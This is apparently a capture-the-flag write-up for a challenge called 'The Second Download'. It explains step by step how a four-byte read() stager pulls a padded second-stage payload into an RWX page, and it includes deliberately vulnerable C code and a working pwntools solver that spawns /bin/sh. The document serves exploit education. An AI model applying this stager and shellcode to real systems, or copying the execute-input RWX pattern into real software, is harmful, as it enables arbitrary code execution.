# The Second Download

## Core concept

The program executes only four attacker-controlled bytes. Four bytes cannot open a shell, but they are enough to invoke another `read()` syscall.

That second `read()` downloads a complete shellcode payload into the same executable memory page.

```text
Four-byte stager
      ↓
read more bytes into RWX memory
      ↓
execution resumes inside the new bytes
      ↓
full shellcode runs
```

This is a self-overwriting shellcode challenge.

## Simplified challenge code

The important logic would look like this:

```c
#include <sys/mman.h>
#include <unistd.h>

typedef void (*entry_t)(int, void *, size_t);

int main(void) {
    void *page;

    page = mmap(
        NULL,
        0x1000,
        PROT_READ | PROT_WRITE | PROT_EXEC,
        MAP_PRIVATE | MAP_ANONYMOUS,
        -1,
        0
    );

    read_exact(STDIN_FILENO, page, 4);

    ((entry_t)page)(0, page, 0x1000);
}
```

The first read accepts exactly four bytes:

```c
read_exact(0, page, 4);
```

The program then calls those bytes like a function with three arguments:

```c
entry(0, page, 0x1000);
```

## Register state

Under the amd64 System V calling convention, the first three function arguments are passed in:

```text
Argument 1 → rdi
Argument 2 → rsi
Argument 3 → rdx
```

Therefore, when the four controlled bytes begin executing:

```text
rdi = 0
rsi = page
rdx = 0x1000
```

These are almost exactly the registers needed for:

```c
read(0, page, 0x1000);
```

The Linux amd64 syscall convention is:

```text
rax = syscall number
rdi = first argument
rsi = second argument
rdx = third argument
```

For `read()`, the syscall number is zero:

```text
rax = 0
```

The only missing step is clearing `rax`.

## The four-byte stager

The player sends:

```asm
xor eax, eax
syscall
```

The machine code is:

```text
31 c0 0f 05
```

Exactly four bytes.

### `xor eax, eax`

```asm
xor eax, eax
```

This sets:

```text
rax = 0
```

Because syscall zero is `read`, the registers now represent:

```c
read(0, page, 0x1000);
```

### `syscall`

```asm
syscall
```

The kernel reads more attacker-controlled data into the RWX page.

The important part is that it writes the new payload at the beginning of the same page currently executing.

## Self-overwriting behavior

Initially, memory looks like:

```text
page + 0:  31 c0       xor eax, eax
page + 2:  0f 05       syscall
page + 4:  00 00 ...
```

When the CPU executes `syscall`, its next instruction address is already:

```text
page + 4
```

The new `read()` overwrites memory starting at `page + 0`.

Suppose the second payload is:

```text
AAAA + shellcode
```

After the read, memory becomes:

```text
page + 0:  A
page + 1:  A
page + 2:  A
page + 3:  A
page + 4:  beginning of shellcode
```

When the kernel finishes the read syscall, execution resumes at:

```text
page + 4
```

That is why the second payload needs four padding bytes before its real shellcode.

```text
Second payload:

┌──────────────────┬─────────────────────────┐
│ 4 ignored bytes  │ complete shellcode      │
└──────────────────┴─────────────────────────┘
 page + 0            page + 4
                           ↑
                     execution resumes here
```

Without the four-byte padding, execution would skip the first four bytes of the real shellcode and probably crash.

## Solver

A minimal solver would be:

```python
#!/usr/bin/env python3
from pwn import *

context.arch = "amd64"
context.log_level = "error"

io = remote("127.0.0.1", 9008)

stager = asm("""
    xor eax, eax
    syscall
""")

shellcode = asm(shellcraft.sh())

second_stage = b"A" * 4
second_stage += shellcode

io.sendafter(b"FIRST FRAGMENT: ", stager + second_stage)
io.interactive()
```

## Why both stages can be sent together

The challenge's first function reads exactly four bytes:

```c
read_exact(0, page, 4);
```

Even if pwntools sends everything together:

```text
4-byte stager + padded shellcode
```

the program consumes only the first four bytes.

The rest remains waiting in the socket:

```text
Socket before first read:
[stager][padding][shellcode]

After read_exact(..., 4):
page:   [stager]
socket: [padding][shellcode]
```

The program calls the stager, which executes another `read()`:

```text
page:   [padding][shellcode]
socket: empty
```

Execution then resumes at `page + 4`, where the shellcode begins.

## Complete execution sequence

```text
1. Program creates an RWX page.

2. Player sends:
   [31 c0 0f 05][AAAA][shellcode]

3. Program reads exactly:
   [31 c0 0f 05]

4. Remaining socket data:
   [AAAA][shellcode]

5. Program calls the RWX page with:
   rdi = 0
   rsi = page
   rdx = 0x1000

6. xor eax, eax:
   rax = 0

7. syscall:
   read(0, page, 0x1000)

8. The second payload overwrites the page:
   [AAAA][shellcode]

9. syscall returns to page + 4.

10. The shellcode executes.

11. execve("/bin/sh", ...) creates a shell.
```

## Why the normal protections do not stop it

The challenge can be compiled with:

```text
PIE enabled
NX enabled
Full RELRO
Stack canary enabled
```

They do not prevent the exploit because:

- No stack overflow occurs.
- No return address is modified.
- No GOT entry is overwritten.
- No binary address is required.
- The stack is not used for executable code.
- The program deliberately creates an RWX page and calls it.

The only executable attacker-controlled memory is the mapped page.

## Difference from Erna Hoover

Erna Hoover uses:

```text
large shellcode on executable stack
            ↑
tiny trampoline jumps backward to it
```

The Second Download uses:

```text
four-byte read stager in RWX memory
            ↓
downloads larger shellcode over itself
            ↓
continues at offset four
```

The important skills are therefore different:

- Inspecting register arguments at an indirect call.
- Understanding the Linux syscall ABI.
- Building a four-byte read stager.
- Understanding where RIP resumes after `syscall`.
- Accounting for self-overwritten bytes with padding.
